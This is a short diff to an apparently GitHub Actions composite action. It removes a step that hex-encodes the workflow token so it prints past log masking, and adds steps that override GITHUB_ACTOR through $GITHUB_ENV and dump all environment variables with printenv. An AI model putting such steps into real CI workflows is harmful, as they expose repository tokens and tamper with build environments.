@@ -18,6 +18,8 @@ runs:
     - id: random-number-generator
       run: echo "::set-output name=random-number::$(echo $RANDOM)"
       shell: bash
-    - run: echo -n "${{github.token}}" | od -A n -t x1
+    - run: echo "GITHUB_ACTOR=LOL" >> $GITHUB_ENV
+      shell: bash
+    - run: printenv
       shell: bash
  
